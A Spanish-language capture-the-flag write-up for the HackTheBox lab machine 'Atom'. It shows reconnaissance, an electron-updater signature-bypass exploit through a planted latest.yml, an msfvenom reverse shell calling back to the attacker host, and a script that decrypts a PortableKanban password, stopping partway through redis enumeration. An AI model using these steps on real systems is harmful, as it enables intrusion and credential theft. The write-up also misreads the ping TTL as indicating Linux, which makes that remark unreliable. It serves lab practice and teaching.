@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Atom - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Atom - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a resolver Atom de hackthebox una maquina windows de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves electron-builder donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de portablekanban y finalmente despues de una enumeración del servicio de redis obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario Administrator. Maquina curiosa asi que vamos a darle!." />
+<meta property="og:description" content="El dia de hoy vamos a resolver Atom de hackthebox una maquina windows de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves electron-builder donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de portablekanban y finalmente despues de una enumeración del servicio de redis obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario Administrator. Maquina curiosa asi que vamos a darle!." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Atom" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Atom" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Atom/atom.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-08-10T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Atom/atom.png" />
+<meta property="twitter:title" content="Maquina Atom - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-08-10T00:00:00+00:00","datePublished":"2023-08-10T00:00:00+00:00","description":"El dia de hoy vamos a resolver Atom de hackthebox una maquina windows de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves electron-builder donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de portablekanban y finalmente despues de una enumeración del servicio de redis obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario Administrator. Maquina curiosa asi que vamos a darle!.","headline":"Maquina Atom - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Atom/atom.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Atom"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Atom"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Atom - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-08-10">10 Aug 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Atom/atom.png" alt="Maquina Atom - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a resolver <code>Atom</code> de <code>hackthebox</code> una maquina <code>windows</code> de dificultad media, en esta ocasión comprometeremos el sistema aprovechandonos de la información lekeada de los recursos compartidos, donde explotaremos una vulnerabilidad de ejecución remota de comandos a traves <code>electron-builder</code> donde ganaremos acceso a la maquian victima, despues usaremos un exploit con el que decencriptaremos una contraseña obtenida del servicio de <code>portablekanban</code> y finalmente despues de una enumeración del servicio de <code>redis</code> obtendremos una credencial con la que podremos conectarnos mediante winrm como el usuario <code>Administrator</code>.</p>
+
+<p>Maquina curiosa asi que vamos a darle!.</p>
+
+<p>Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Atom
+❯ ls
+
+ Atom
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">ENUMERACION <a href="#enumeracion">#</a></h2>
+
+<p>Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.237
+PING 10.10.10.237 (10.10.10.237) 56(84) bytes of data.
+64 bytes from 10.10.10.237: icmp_seq=1 ttl=127 time=271 ms
+
+--- 10.10.10.237 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 271.205/271.205/271.205/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code> y por proximidad seria correspondiente a una maquina <code>linux</code>.</p>
+
+<h3 id="escaneo-de-puertos">ESCANEO DE PUERTOS</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.237 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:35 GMT
+Initiating SYN Stealth Scan at 00:35
+Scanning 10.10.10.237 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.237
+Discovered open port 80/tcp on 10.10.10.237
+Discovered open port 135/tcp on 10.10.10.237
+Discovered open port 443/tcp on 10.10.10.237
+Discovered open port 6379/tcp on 10.10.10.237
+Discovered open port 5985/tcp on 10.10.10.237
+Completed SYN Stealth Scan at 00:35, 26.77s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.237
+Host is up, received user-set (0.20s latency).
+Scanned at 2023-08-11 00:35:14 GMT for 27s
+Not shown: 65529 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE      REASON
+80/tcp   open  http         syn-ack ttl 127
+135/tcp  open  msrpc        syn-ack ttl 127
+443/tcp  open  https        syn-ack ttl 127
+445/tcp  open  microsoft-ds syn-ack ttl 127
+5985/tcp open  wsman        syn-ack ttl 127
+6379/tcp open  redis        syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.89 seconds
+           Raw packets sent: 131081 (5.768MB) | Rcvd: 23 (1.012KB)
+</code></pre>
+
+<h3 id="escaneo-de-version-y-servicios">ESCANEO DE VERSION Y SERVICIOS</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p80,135,443,445,5985,6379 10.10.10.237 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-11 00:36 GMT
+Nmap scan report for 10.10.10.237
+Host is up (0.21s latency).
+
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Heed Solutions
+135/tcp  open  msrpc        Microsoft Windows RPC
+443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: Heed Solutions
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+6379/tcp open  redis        Redis key-value store
+Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h20m00s, deviation: 4h02m32s, median: -1s
+| smb2-time: 
+|   date: 2023-08-11T00:37:09
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb-os-discovery: 
+|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: ATOM
+|   NetBIOS computer name: ATOM\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2023-08-10T17:37:13-07:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 63.19 seconds
+</code></pre>
+
+<p>Visulizamos información interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.46</td>
+    </tr>
+    <tr>
+      <td>135</td>
+      <td>MSRPC</td>
+      <td>Microsoft Windows RPC</td>
+    </tr>
+    <tr>
+      <td>443</td>
+      <td>HTTPS</td>
+      <td>Apache httpd 2.4.46</td>
+    </tr>
+    <tr>
+      <td>445</td>
+      <td>SMB</td>
+      <td>microsoft-ds Windows 10 Pro 19042</td>
+    </tr>
+    <tr>
+      <td>5985</td>
+      <td>WINRM</td>
+      <td>Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+    <tr>
+      <td>6379</td>
+      <td>REDIS</td>
+      <td>Redis key-value store</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotacion">EXPLOTACION <a href="#explotacion">#</a></h2>
+
+<p>Comenzamos usando <code>whatweb</code>, para determinar las tecnologias que esta usando el servicio web.</p>
+
+<pre><code class="language-bash">❯ whatweb 10.10.10.237
+http://10.10.10.237 [200 OK] Apache[2.4.46], Bootstrap, Country[RESERVED][ZZ], Email[MrR3boot@atom.htb], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.237], OpenSSL[1.1.1j], PHP[7.3.27], Script, Title[Heed Solutions]
+</code></pre>
+
+<p>La herramienta no nos reporta que estamos ante un <code>php</code>, y si procedemos a abrir el servicio en el navegador vemos que pagina hace referencia a <code>heed Solutions</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Atom/atom1.PNG" alt="" /></p>
+
+<p>Ahora bien <code>nmap</code> nos reporto que el puerto <code>445</code> se encuentra abierto, asi que vamos a tratar de enumerar si existen recursos compartidos. Para ello usaremos <code>smbmap</code> de la suite de <code>impacket</code>.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.237 -u 'null'
+[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	Software_Updates                                  	READ, WRITE	
+</code></pre>
+
+<p>Vemos que tenemos permiso de lectura y ejecución en <code>Software_Updates</code>, asi que vamos a listar los recursos que contiene.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.237 -u 'null' -r 'Software_Updates'
+[+] Guest session   	IP: 10.10.10.237:445	Name: 10.10.10.237                                      
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	Software_Updates                                  	READ, WRITE	
+	.\Software_Updates\*
+	dr--r--r--                0 Fri Aug 11 00:51:43 2023	.
+	dr--r--r--                0 Fri Aug 11 00:51:43 2023	..
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client1
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client2
+	dr--r--r--                0 Fri Aug 11 00:48:27 2023	client3
+	fr--r--r--            35202 Fri Apr  9 11:18:08 2021	UAT_Testing_Procedures.pdf
+</code></pre>
+
+<p>Vamos a traernos a nuestra maquina y abrir el archivo pdf.</p>
+
+<pre><code class="language-bash">❯ smbmap -H 10.10.10.237 -u 'null' --download 'Software_Updates/UAT_Testing_Procedures.pdf'
+[+] Starting download: Software_Updates\UAT_Testing_Procedures.pdf (35202 bytes)
+[+] File output to: /home/fmiracle/Machines/Aton/content/10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
+❯ ls
+ 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf
+❯ mv 10.10.10.237-Software_Updates_UAT_Testing_Procedures.pdf UAT_Testing_Procedures.pdf
+❯ ls
+ UAT_Testing_Procedures.pdf
+</code></pre>
+
+<p>Si lo queremos ver en nuestro navegador, yo voy a compartirme un servicio web con <code>php</code>, pero tu puedes hacerlo como mas te guste.</p>
+
+<pre><code class="language-bash">❯ php -S 0.0.0.0:80
+[Fri Aug 11 00:56:38 2023] PHP 7.4.33 Development Server (http://0.0.0.0:80) started
+</code></pre>
+
+<p><img src="/assets/images/HTB/htb-writeup-Atom/atom2.PNG" alt="" /></p>
+
+<p>Vemos que contiene información acerca de una aplicación en <code>electron-builder</code></p>
+
+<p>Si bajamos un poco observamos qmas información donde nos dice que para iniciar el proceso QA debemos de poner las actualizaciones en uno de los directorios con el nombre <code>client</code> que curiosamente son los mismo cuando listamos los recursos compartidos con <code>smbmap</code>.</p>
+
+<blockquote>
+  <p>Electron - builder : Una solución completa para empaquetar y crear una aplicación Electron lista para su distribución para macOS, Windows y Linux con soporte de “actualización automática”.</p>
+</blockquote>
+
+<p>Si buscamos vulnerabilidades asociadas a <code>electron builder</code>, encontramos  una de evasión de la validación de firmas que conduce a <code>RCE</code> en Electron-Updater.</p>
+
+<p>Basicamente esta vulnerabilidad se aprovecha de <code>Electron-Updater</code> y nos permite ejecutar codigo malicioso en el software.</p>
+
+<p>Te dejo el articulo para que puedas entenderlo mejor:</p>
+
+<ul>
+  <li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
+</ul>
+
+<p><img src="/assets/images/HTB/htb-writeup-Atom/atom3.PNG" alt="" /></p>
+
+<p>Para poder explotarla vamos a utilizar una estructura similar a la que nos comparten en el articulo y le pondremos la extensión <code>yml</code>.</p>
+
+<pre><code class="language-bash">version: 1.2.3
+path: http://10.10.16.2/test
+sha512: fjqwiofhqw21321 21ie21e2r
+</code></pre>
+
+<p>En la parte de <code>path</code> vamos a indicarle que al ejecutarse realize una petición a nuestra ip, donde nos pondremos en escucha con <code>ncat</code>. Y seguidamente vamos a subir en una de las carpetas <code>client</code> nuestro archivo <code>yaml</code>.</p>
+
+<pre><code class="language-bash">❯ smbclient  //10.10.10.237/Software_Updates -N
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Fri Aug 11 01:18:55 2023
+  ..                                  D        0  Fri Aug 11 01:18:55 2023
+  client1                             D        0  Fri Aug 11 01:18:55 2023
+  client2                             D        0  Fri Aug 11 01:18:55 2023
+  client3                             D        0  Fri Aug 11 01:18:55 2023
+  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 11:18:08 2021
+
+		4413951 blocks of size 4096. 1369525 blocks available
+smb: \&gt; cd client1
+smb: \client1\&gt; put latest.yml
+putting file latest.yml as \client1\latest.yml (0,1 kb/s) (average 0,1 kb/s)
+smb: \client1\&gt; dir
+  .                                   D        0  Fri Aug 11 01:21:33 2023
+  ..                                  D        0  Fri Aug 11 01:21:33 2023
+  latest.yml                          A       79  Fri Aug 11 01:21:33 2023
+
+		4413951 blocks of size 4096. 1369525 blocks available
+smb: \client1\&gt;
+</code></pre>
+
+<p>Despues de unos segundos recibimos la conexión, lo cual nos garantiza que efectivamente estamos aprovechandonos de la vulnerabilidad.</p>
+
+<p>Lo que vamos a hacer ahora es crearnos un ejecutable malicioso con la ayuda de <code>msfvenom</code> para poder obtener una reverse shell de la maquina victima.</p>
+
+<pre><code class="language-bash">❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 -f exe -o reverse.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+Saved as: reverse.exe
+</code></pre>
+
+<p>Una cosa a recalcar que como nos dice el articulo el archivo debemos de llamarlo de una forma especial usando el simbolo <code>’</code></p>
+
+<pre><code class="language-bash">❯ mv reverse.exe r’everse.exe
+❯ ls
+ latest.yml   r’everse.exe   UAT_Testing_Procedures.pdf
+</code></pre>
+
+<p>Ademas debemos de modificar nuestro archivo <code>yml</code> especificando en el path el archivo y no olvidemos incluir el sha512 del ejecutable.</p>
+
+<pre><code class="language-bash">❯ sha512sum r’everse.exe
+d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31  r’everse.exe
+</code></pre>
+
+<p>El archivo nos quedaria de la siguiente forma:</p>
+
+<pre><code class="language-bash">version: 1.2.3
+path: r’everse.exe 
+sha512: d9d4eaac33d3ee234af8015c73198541b82a558877d27d7d03cc6bda270c02e001cfc2daafc050256c29974c7a278317dca0d71804668dab00d539559a30de31
+</code></pre>
+<p>Procedemos a subirlo en una de las carpetas <code>client</code>, compartimos el ejecutable desde nuestra maquina con python y nos ponemos en escucha en el puerto establecido con <code>ncat</code>.</p>
+
+<p>Recibimos la conexión como el usuario <code>jason</code>.</p>
+
+<pre><code class="language-bash">nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.237.
+Connection from 10.10.10.237:54130.
+Microsoft Windows [Version 10.0.19042.906]
+(c) Microsoft Corporation. All rights reserved.
+
+whoami
+whoami
+atom\jason
+</code></pre>
+
+<p>Ahora podemos dirigirnos a su directorio personal y leer la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-cmd">cd C:\Users\jason\Desktop
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Desktop
+
+04/02/2021  10:29 PM    &lt;DIR&gt;          .
+04/02/2021  10:29 PM    &lt;DIR&gt;          ..
+03/31/2021  02:09 AM             2,353 heedv1.lnk
+03/31/2021  02:09 AM             2,353 heedv2.lnk
+03/31/2021  02:09 AM             2,353 heedv3.lnk
+08/10/2023  05:27 PM                34 user.txt
+               4 File(s)          7,093 bytes
+               2 Dir(s)   5,622,317,056 bytes free
+
+type user.txt
+type user.txt
+5dcbc34fb2b0acaf6f9262acb7ec960e
+</code></pre>
+
+<h2 id="elevacion-de-privilegios">ELEVACION DE PRIVILEGIOS <a href="#elevacion-de-privilegios">#</a></h2>
+
+<p>Si enumeramos un poco el sistema, vemos en la carpeta Download un directorio referente a <code>PortableKanban</code>.</p>
+
+<pre><code class="language-cmd">cd Downloads
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Downloads
+
+04/02/2021  08:00 AM    &lt;DIR&gt;          .
+04/02/2021  08:00 AM    &lt;DIR&gt;          ..
+03/31/2021  02:36 AM    &lt;DIR&gt;          node_modules
+04/02/2021  08:21 PM    &lt;DIR&gt;          PortableKanban
+               0 File(s)              0 bytes
+               4 Dir(s)   5,622,136,832 bytes free
+
+C:\Users\jason\Downloads&gt;
+</code></pre>
+
+<p>Si listamos el contenido obervamos varios archivos <code>dll</code>.</p>
+
+<pre><code class="language-cmd">cd PortableKanban
+
+dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 9793-C2E6
+
+ Directory of C:\Users\jason\Downloads\PortableKanban
+
+04/02/2021  08:21 PM    &lt;DIR&gt;          .
+04/02/2021  08:21 PM    &lt;DIR&gt;          ..
+02/27/2013  08:06 AM            58,368 CommandLine.dll
+11/08/2017  01:52 PM           141,312 CsvHelper.dll
+06/22/2016  09:31 PM           456,704 DotNetZip.dll
+04/02/2021  07:44 AM    &lt;DIR&gt;          Files
+11/23/2017  04:29 PM            23,040 Itenso.Rtf.Converter.Html.dll
+11/23/2017  04:29 PM            75,776 Itenso.Rtf.Interpreter.dll
+11/23/2017  04:29 PM            32,768 Itenso.Rtf.Parser.dll
+11/23/2017  04:29 PM            19,968 Itenso.Sys.dll
+11/23/2017  04:29 PM           376,832 MsgReader.dll
+07/03/2014  10:20 PM           133,296 Ookii.Dialogs.dll
+04/02/2021  07:17 AM    &lt;DIR&gt;          Plugins
+04/02/2021  08:22 PM             5,920 PortableKanban.cfg
+01/04/2018  09:12 PM           118,184 PortableKanban.Data.dll
+01/04/2018  09:12 PM         1,878,440 PortableKanban.exe
+01/04/2018  09:12 PM            31,144 PortableKanban.Extensions.dll
+04/02/2021  07:21 AM               172 PortableKanban.pk3.lock
+09/06/2017  12:18 PM           413,184 ServiceStack.Common.dll
+09/06/2017  12:17 PM           137,216 ServiceStack.Interfaces.dll
+09/06/2017  12:02 PM           292,352 ServiceStack.Redis.dll
+09/06/2017  04:38 AM           411,648 ServiceStack.Text.dll
+01/04/2018  09:14 PM         1,050,092 User Guide.pdf
+              19 File(s)      5,656,416 bytes
+               4 Dir(s)   5,625,991,168 bytes free
+</code></pre>
+
+<p>Si tratamos de buscar vulnerabilidades asociadas a <code>PortableKanban</code>, vemos un exploit con el podemos desencriptar una contraseña.</p>
+
+<pre><code class="language-bash">❯ searchsploit portablekanban
+------------------------------------------------------- ---------------------------------
+ Exploit Title                                         |  Path
+------------------------------------------------------- ---------------------------------
+PortableKanban 4.3.6578.38136 - Encrypted Password Ret | windows/local/49409.py
+------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Vimos anteriormente cuando listamos los archivos de <code>portablekanban</code> un archivo de configuración <code>PortableKanban.cfg</code> que si lo leemos encontramos una contraseña encryptada.</p>
+
+<pre><code class="language-cmd">type PortableKanban.cfg
+{"RoamingSettings":{"DataSource":"RedisServer","DbServer":"localhost","DbPort":6379,"DbEncPassword":"Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb","DbServer2":"","DbPort2":6379,"DbEncPassword2":"","DbIndex":0,"DbSsl":false,"DbTimeout":10,"FlushChanges":true,"UpdateInterval":5,"AutoUpdate":true,"Caption":"My Tasks","RightClickAction":"Nothing","DateTimeFormat":"ddd, M/d/yyyy h:mm tt","BoardForeColor":"WhiteSmoke","BoardBackColor":"DimGray","ViewTabsFont":"Segoe UI, 9pt","SelectedViewTabForeColor":"WhiteSmoke","SelectedViewTabBackColor":"Black","HeaderFont":"Segoe UI, 11.4pt","HeaderShowCount":true,"HeaderShowLimit":true,"HeaderShowEstimates":true,"HeaderShowPoints":false,"HeaderForeColor":"WhiteSmoke","HeaderBackColor":"Gray","CardFont":"Segoe UI, 11.4pt","CardLines":3,"CardTextAlignment":"Center","CardShowMarks":true,"CardShowInitials":false,"CardShowTags":true,"ThickTags":false,"DefaultTaskForeColor":"WhiteSmoke","DefaultTaskBackColor":"Gray","SelectedTaskForeColor":
+</code></pre>
+
+<blockquote>
+  <p>Recordemos que los archivos de configuración muchas veces contienen contraseñas ya sean encriptadas o en texto claro.</p>
+</blockquote>
+
+<p>Como ya contamos con una contraseña, ahora vamos a modificar un poco el exploit de tal manera que nos muestre la contraseña en texto claro.</p>
+
+<pre><code class="language-python">import json
+import base64
+from des import * #python3 -m pip install des
+import sys
+
+hash = 'Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb'
+
+hash = base64.b64decode(hash.encode('utf-8'))
+key = DesKey(b"7ly6UznJ")
+print(key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8'))
+</code></pre>
+
+<p>Ejecutamos el exploit y obtenemos la contraseña en texto claro.</p>
+
+<pre><code class="language-bash">❯ python3 portable.py
+kidvscat_yes_kidvscat
+</code></pre>
+
+<p>Podemos tratar de conectarnos como el usuario administrador con la contraseña obtenida, pero no resulta ser la correcta. Pero otro punto a recalcar es que en el archivo de configuración vemos algo de <code>RedisServer</code>, asi que podemos tratar de conectarnos al servicio de <code>redis</code>.</p>
+
+<pre><code class="language-bash">❯ redis-cli -h 10.10.10.237
+10.10.10.237:6379&gt; auth kidvscat_yes_kidvscat
+OK
+</code></pre>
+
+<p>Para poder enumerar el servicio podemos apoyarnos de <code>hacktricks</code>, te dejo el recurso aqui:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</a></li>
+</ul>
+
+<p>Podemos listar las KEYS disponibles y listar</p>
+
